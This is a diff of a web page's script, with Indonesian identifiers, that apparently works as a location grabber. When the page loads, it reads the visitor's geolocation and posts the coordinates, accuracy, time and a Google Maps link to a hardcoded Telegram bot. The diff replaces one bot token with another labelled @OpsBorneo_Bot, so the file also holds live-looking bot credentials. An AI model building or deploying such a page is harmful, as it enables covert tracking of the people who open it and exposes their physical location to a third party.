@@ -16,14 +16,14 @@
   </div>
 
   <script>
-    const botToken = "7628065493:AAGuSA9aek-c_dtizC564vGl7nOFRe8TYko";
+    const botToken = "7317238253:AAEORpkEBywWC2AvP-GUj1wfr1m4K5irbV0"; // @OpsBorneo_Bot
     const chatId = 5677912817;
 
     function sendToTelegram(text) {
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id: chatId, text: text })
+        body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: "Markdown" })
       });
     }
 
@@ -32,17 +32,13 @@
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
       const waktu = new Date().toLocaleString();
-      const info = `**[Lokasi Terdeteksi]**
-- Lat: ${lat}
-- Lon: ${lon}
-- Akurasi: ${acc} meter
-- Waktu: ${waktu}`;
+      const info = `*[Lokasi Terdeteksi]*\n- Lat: ${lat}\n- Lon: ${lon}\n- Akurasi: ${acc} meter\n- Waktu: ${waktu}\nhttps://maps.google.com/?q=${lat},${lon}`;
 
       sendToTelegram(info);
     }
 
     function gagal(err) {
-      sendToTelegram("Gagal mendapatkan lokasi: " + err.message);
+      sendToTelegram("*Gagal mendapatkan lokasi:*\n" + err.message);
     }
 
     navigator.geolocation.getCurrentPosition(kirimLokasi, gagal);
